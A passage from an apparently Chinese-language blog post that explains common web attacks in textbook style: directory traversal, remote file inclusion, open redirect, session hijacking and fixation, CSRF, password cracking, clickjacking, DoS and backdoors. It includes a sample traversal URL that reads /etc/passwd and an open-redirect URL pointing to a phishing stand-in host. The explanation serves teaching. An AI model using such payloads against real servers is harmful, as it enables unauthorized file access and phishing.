+<p><a name="cf3e2664-1"></a></p>
+<h4 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h4><p>指定某个文件名。然后从 &#x2F;www&#x2F;log&#x2F; 文件目录下 读取这个指定的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/read.php?log=0401.log</span><br></pre></td></tr></table></figure>
+
+<p>攻击者设置如下查询字段后发出请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/read.php?log=../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>查询字段为了读取攻击者盯上的&#x2F;etc&#x2F;passwd文件，会从&#x2F;www&#x2F;log&#x2F;目录开始定位相对路径。如果这份read.php脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707033959-f87a14bb-82bb-4649-84b8-33f50748b01e.png#align=left&display=inline&height=349&originHeight=349&originWidth=616&size=119628&status=done&style=none&width=616" alt="image.png"></p>
+<p><a name="8f9b7ab4"></a></p>
+<h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h3><p>远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。</p>
+<p>这主要是 PHP 存在的安全漏洞，对PHP的include或require来说，这是一种可通过设定，指定外部服务器的 URL作为文件名的功能。但是，该功能太危险，PHP5.2.0之后默认设定此功能无效。</p>
+<p>固然存在输出值转义的问题，但更应控制对任意文件名的指定。</p>
+<p><a name="acbc1930"></a></p>
+<h2 id="因设置或设计上的缺陷引发的安全漏洞"><a href="#因设置或设计上的缺陷引发的安全漏洞" class="headerlink" title="因设置或设计上的缺陷引发的安全漏洞"></a>因设置或设计上的缺陷引发的安全漏洞</h2><p>因设置或设计上的缺陷引发的安全漏洞是指，错误设置Web服务器，或是由设计上的一些问题引起的安全漏洞。</p>
+<p><a name="9cd878ab"></a></p>
+<h3 id="强制浏览"><a href="#强制浏览" class="headerlink" title="强制浏览"></a>强制浏览</h3><p>强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器 的公开目录下的文件中，浏览那些原本非自愿公开的文件。</p>
+<ul>
+<li>泄露顾客的个人信息等重要情报</li>
+<li>泄露原本需要具有访问权限的用户才可查阅的信息内容</li>
+<li>泄露未外连到外界的文件</li>
+</ul>
+<p><a name="55937c63"></a></p>
+<h3 id="不正确的错误消息处理"><a href="#不正确的错误消息处理" class="headerlink" title="不正确的错误消息处理"></a>不正确的错误消息处理</h3><p>不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。</p>
+<ul>
+<li>Web 应用抛出的错误消息</li>
+<li>数据库等系统抛出的错误消息</li>
+</ul>
+<p>Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示。</p>
+<p><a name="7128f933"></a></p>
+<h3 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h3><p>开放重定向（Open Redirect）是一种对指定的任意URL作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导至那个Web网站。</p>
+<p><a name="cf3e2664-2"></a></p>
+<h4 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h4><p>向 URL指定参数后，使本来的 URL发生重定向跳 转。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?redirect=http://www.tricorder.jp</span><br></pre></td></tr></table></figure>
+
+<p>攻击者把重定向指定的参数改写成已设好陷阱的 Web 网站对应 的 连接，如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?redirect=http://hackr.jp</span><br></pre></td></tr></table></figure>
+
+<p>可信度高的 Web 网站如果开放重定向功能，则很有可能被攻击者选中并用来作为钓鱼攻击的跳板。</p>
+<p><a name="8d2e004d"></a></p>
+<h2 id="因会话管理疏忽引发的安全漏洞"><a href="#因会话管理疏忽引发的安全漏洞" class="headerlink" title="因会话管理疏忽引发的安全漏洞"></a>因会话管理疏忽引发的安全漏洞</h2><p>会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果。</p>
+<p><a name="4cdd27f1"></a></p>
+<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707043888-61932cdc-ac11-426d-b3be-ca06a12f9216.png#align=left&display=inline&height=383&originHeight=383&originWidth=740&size=215612&status=done&style=none&width=740" alt="image.png"></p>
+<p>具备认证功能的Web应用，使用会话ID的会话管理机制，作为管理认证状态的主流方式。会话 ID 中记录客户端的Cookie等信息，服务器端将会话ID与认证状态进行一对一匹配管理。</p>
+<ul>
+<li>通过非正规的生成方法推测会话 ID</li>
+<li>通过窃听或 XSS 攻击盗取会话 ID</li>
+<li>通过会话固定攻击（Session Fixation）强行获取会话 ID</li>
+</ul>
+<p><a name="cf3e2664-3"></a></p>
+<h4 id="案例-3"><a href="#案例-3" class="headerlink" title="案例"></a>案例</h4><p>认证功能通过会 话管理机制，会将成功认证的用户的会话 ID（SID）保存在用户 浏览器的 Cookie 中。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707052390-99a315ea-d46d-4479-9352-743782b255f0.png#align=left&display=inline&height=423&originHeight=423&originWidth=700&size=230227&status=done&style=none&width=700" alt="image.png"><br>攻击者在得知该 Web 网站存在可跨站攻击（XSS）的安全漏洞 后，就设置好用 JavaScript 脚本调用 document.cookie以窃取Cookie信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击 者就能获取含有会话 ID 的 Cookie。</p>
+<p>攻击者拿到用户的会话ID后，往自己的浏览器的Cookie中设置该会话ID，即可伪装成会话 ID 遭窃的用户，访问 Web 网站了。</p>
+<p><a name="d0d1521e"></a></p>
+<h3 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h3><p>对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话ID，属于被动攻击。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707061454-93074980-c071-4e70-bfc5-12300101b20a.png#align=left&display=inline&height=410&originHeight=410&originWidth=722&size=240082&status=done&style=none&width=722" alt="image.png"></p>
+<p><a name="b96e56bd"></a></p>
+<h3 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h3><p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击</p>
+<p>影响：</p>
+<ul>
+<li>利用已通过认证的用户权限更新设定信息等</li>
+<li>利用已通过认证的用户权限购买商品</li>
+<li>利用已通过认证的用户权限在留言板上发表言论</li>
+</ul>
+<p><a name="423219cf"></a></p>
+<h4 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例"></a>攻击案例</h4><p>以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707069889-e9d934a9-7d6a-4552-9ddd-11a495ecd306.png#align=left&display=inline&height=494&originHeight=494&originWidth=723&size=265020&status=done&style=none&width=723" alt="image.png"></p>
+<p><a name="ea971767"></a></p>
+<h2 id="其他安全漏洞"><a href="#其他安全漏洞" class="headerlink" title="其他安全漏洞"></a>其他安全漏洞</h2><p><a name="439f6aa1"></a></p>
+<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不 仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等）</p>
+<p>密码破解有以下两种手段：</p>
+<ul>
+<li>通过网络的密码试错</li>
+<li>对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）</li>
+</ul>
+<p>除去突破认证的攻击手段，还有SQL注入攻击逃避认证，跨站脚本攻击窃取密码信息等方法。</p>
+<p><a name="d40c9e5a"></a></p>
+<h4 id="通过网络进行密码试错"><a href="#通过网络进行密码试错" class="headerlink" title="通过网络进行密码试错"></a>通过网络进行密码试错</h4><p>对 Web 应用提供的认证功能，通过网络尝试候选密码进行的一种攻击。主要有以下两种方式。</p>
+<ul>
+<li>穷举法</li>
+<li>字典攻击</li>
+</ul>
+<p><a name="3cd7719b"></a></p>
+<h5 id="穷举法"><a href="#穷举法" class="headerlink" title="穷举法"></a>穷举法</h5><p>穷举法（Brute-force Attack，又称暴力破解法）是指对所有密钥集合构成的密钥空间（Keyspace）进行穷举。即，用所有可行的候选密码对目标的密码系统试错，用以突破验证的一种攻击。</p>
+<p>银行采用的个人识别码是由“4位数字”组成的密码，那么就要从0000~9999中的全部数字逐个进行尝试。</p>
+<p><a name="678d6400"></a></p>
+<h5 id="字典攻击"><a href="#字典攻击" class="headerlink" title="字典攻击"></a>字典攻击</h5><p>字典攻击是指利用事先收集好的候选密码（经过各种组合方式后存入字典），枚举字典中的密码，尝试通过认证的一种攻击手法。</p>
+<p>还是举银行采用个人识别码是“4位数字”的密码的例子，考虑到用户使用自己的生日做密码的可能性较高，于是就可以把生日日期数值化，如将0101~1231保存成字典，进行尝试。</p>
+<p>与穷举法相比，由于需要尝试的候选密码较少，意味着攻击耗费的时间比较短。但是，如果字典中没有正确的密码，那就无法破解成功。因此攻击的成败取决于字典的内容。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707080739-ce82dfdc-f4c5-4d4e-a081-31e4e8ec575a.png#align=left&display=inline&height=520&originHeight=520&originWidth=708&size=221507&status=done&style=none&width=708" alt="image.png"></p>
+<blockquote>
+<p>利用别处泄露的 ID·密码进行攻击</p>
+</blockquote>
+<blockquote>
+<p>字典攻击中有一种利用其他Web网站已泄露的ID及密码列表进行的攻击。很多用户习惯随意地在多个 Web 网站使用同一 套 ID及密码，因此攻击会有相当高的成功几率1。</p>
+</blockquote>
+<p><a name="c376363f"></a></p>
+<h4 id="对已加密密码的破解"><a href="#对已加密密码的破解" class="headerlink" title="对已加密密码的破解"></a>对已加密密码的破解</h4><p>Web 应用在保存密码时，一般不会直接以明文的方式保存，通过散列函数做散列处理或加 salt 的手段对要保存的密码本身加密。那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这些密码，则必须先通过解码等手段，把加密处理的密码还原成明 文形式<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707088821-8d07f62b-234c-4b7c-bf32-ab4541a98066.png#align=left&display=inline&height=385&originHeight=385&originWidth=735&size=174946&status=done&style=none&width=735" alt="image.png"></p>
+<p>通常有以下几种方法。</p>
+<ul>
+<li>通过穷举法 字典攻击进行类推</li>
+<li>彩虹表</li>
+<li>拿到密钥</li>
+<li>加密算法的漏洞</li>
+</ul>
+<p><a name="3fb8fde0"></a></p>
+<h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><p>点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在Web页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p>
+<p>已设置陷阱的 Web 页面，表面上内容并无不妥，但早已埋入想让用户点击的链接。当用户点击到透明的按钮时，实际上是点击了已指定透明属性元素的 iframe 页面。</p>
+<p><a name="d36bec18"></a></p>
+<h3 id="DoS-攻击"><a href="#DoS-攻击" class="headerlink" title="DoS 攻击"></a>DoS 攻击</h3><p>DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。</p>
+<p>两种 DoS 攻击方式</p>
+<ul>
+<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。</li>
+<li>通过攻击安全漏洞使服务停止。</li>
+</ul>
+<p>其中，集中利用访问请求的DoS攻击，单纯来讲就是发送大量的合法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防止 DoS 攻击。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707098372-4a134ef3-a78a-44e6-8a85-5cfc3b278592.png#align=left&display=inline&height=493&originHeight=493&originWidth=708&size=284920&status=done&style=none&width=708" alt="image.png"></p>
+<p>多台计算机发起的 DoS 攻击称为 DDoS 攻击（Distributed Denial of Service attack）。DDoS攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。</p>
+<p><a name="5c9015a4"></a></p>
+<h3 id="后门程序"><a href="#后门程序" class="headerlink" title="后门程序"></a>后门程序</h3><p>后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能</p>
+<p>三种类型：</p>
+<ul>
+<li>开发阶段作为 Debug 调用的后门程序</li>
+<li>开发者为了自身利益植入的后门程序</li>
+<li>攻击者通过某种方法设置的后门程序</li>
+</ul>
+<p>可通过监视进程和通信的状态发现被植入的后门程序。但设定在Web应用中的后门程序，由于和正常使用时区别不大，通常很难发现。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ohyesc.github.io">Li Jing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ohyesc.github.io/2023/11/20/Http/10.%20Web%20%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-uh5p8t-en6m1o/">https://ohyesc.github.io/2023/11/20/Http/10.%20Web%20%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-uh5p8t-en6m1o/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ohyesc.github.io" target="_blank">我的生活小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Http/">Http</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/20/Http/9.%20%E5%9F%BA%E4%BA%8E%20HTTP%20%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%BD%E5%8A%A0%E5%8D%8F%E8%AE%AE-uh5p8t-fui6m4/" title="9. 基于 HTTP 的功能追加协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">9. 基于 HTTP 的功能追加协议</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/20/Http/11.%20HTTP%202.0%20%E6%A6%82%E8%A7%88-uh5p8t-rs65sz/" title="11. HTTP 2.0 概览"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">11. HTTP 2.0 概览</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/20/Http/1.%20%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80-uh5p8t-cbiby7/" title="1. 网络基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-20</div><div class="title">1. 网络基础</div></div></a></div><div><a href="/2023/11/20/Http/2.%20%E7%AE%80%E5%8D%95HTTP%E5%8D%8F%E8%AE%AE-uh5p8t-zwmmog/" title="2. 简单HTTP协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-20</div><div class="title">2. 简单HTTP协议</div></div></a></div><div><a href="/2023/11/20/Http/3.%20HTTP%20%E6%8A%A5%E6%96%87-uh5p8t-kss9oe/" title="3. HTTP 报文"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-20</div><div class="title">3. HTTP 报文</div></div></a></div><div><a href="/2023/11/20/Http/4.%20%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84%20HTTP%20%E7%8A%B6%EF%BF%BD%EF%BF%BD%EF%BF%BD%E7%A0%81-uh5p8t-epqxm3/" title="4. 返回结果的 HTTP 状态码"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-20</div><div class="title">4. 返回结果的 HTTP 状态码</div></div></a></div><div><a href="/2023/11/20/Http/5.%20%E4%B8%8E%20HTTP%20%E5%8D%8F%E4%BD%9C%E7%9A%84%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8-uh5p8t-bzhd21/" title="5. 与 HTTP 协作的 Web 服务器"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-20</div><div class="title">5. 与 HTTP 协作的 Web 服务器</div></div></a></div><div><a href="/2023/11/20/Http/6.%20HTTP%20%E9%A6%96%E9%83%A8-uh5p8t-do7gaf/" title="6. HTTP 首部"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-20</div><div class="title">6. HTTP 首部</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Li Jing</div><div class="author-info__description">这是一个老父亲答应给孩子建个网站，记录一下他的成长</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-Web-%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">针对 Web 的攻击技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E4%B8%8D%E5%85%B7%E5%A4%87%E5%BF%85%E8%A6%81%E7%9A%84%EF%BF%BD%EF%BF%BD%EF%BF%BD%E5%85%A8%E5%8A%9F%E8%83%BD"><span class="toc-number">1.1.</span> <span class="toc-text">HTTP 不具备必要的���全功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8D%B3%E5%8F%AF%E7%AF%A1%E6%94%B9%E8%AF%B7%E6%B1%82"><span class="toc-number">1.2.</span> <span class="toc-text">在客户端即可篡改请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-Web-%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">针对 Web 应用的攻击模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BA%E7%9B%AE%E6%A0%87%E7%9A%84%E4%B8%BB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.1.</span> <span class="toc-text">以服务器为目标的主动攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BA%E7%9B%AE%E6%A0%87%E7%9A%84%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.2.</span> <span class="toc-text">以服务器为目标的被动攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%A0%E8%BE%93%E5%87%BA%E5%80%BC%E8%BD%AC%E4%B9%89%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">因输出值转义不完全引发的安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">跨站脚本攻击案例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">HTML</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E7%94%A8%E6%88%B7-Cookie-%E7%9A%84%E7%AA%83%E5%8F%96%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">对用户 Cookie 的窃取攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.</span> <span class="toc-text">SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E6%89%A7%E8%A1%8C%E9%9D%9E%E6%B3%95SQL%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.1.</span> <span class="toc-text">会执行非法SQL的SQL注入攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">SQL注入攻击案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OS-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.</span> <span class="toc-text">OS 命令注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OS-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B"><span class="toc-number">2.3.1.</span> <span class="toc-text">OS 注入攻击案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.4.</span> <span class="toc-text">HTTP 首部注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.5.</span> <span class="toc-text">邮件首部注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-number">2.5.1.</span> <span class="toc-text">案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB"><span class="toc-number">2.6.</span> <span class="toc-text">目录遍历攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-1"><span class="toc-number">2.6.1.</span> <span class="toc-text">案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.7.</span> <span class="toc-text">远程文件包含漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%A0%E8%AE%BE%E7%BD%AE%E6%88%96%E8%AE%BE%E8%AE%A1%E4%B8%8A%E7%9A%84%E7%BC%BA%E9%99%B7%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">因设置或设计上的缺陷引发的安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E6%B5%8F%E8%A7%88"><span class="toc-number">3.1.</span> <span class="toc-text">强制浏览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">不正确的错误消息处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">3.3.</span> <span class="toc-text">开放重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%A0%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E7%96%8F%E5%BF%BD%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">因会话管理疏忽引发的安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">4.1.</span> <span class="toc-text">会话劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-3"><span class="toc-number">4.1.1.</span> <span class="toc-text">案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">会话固定攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">4.3.</span> <span class="toc-text">跨站点请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B"><span class="toc-number">4.3.1.</span> <span class="toc-text">攻击案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">其他安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">5.1.</span> <span class="toc-text">密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E8%AF%95%E9%94%99"><span class="toc-number">5.1.1.</span> <span class="toc-text">通过网络进行密码试错</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A9%B7%E4%B8%BE%E6%B3%95"><span 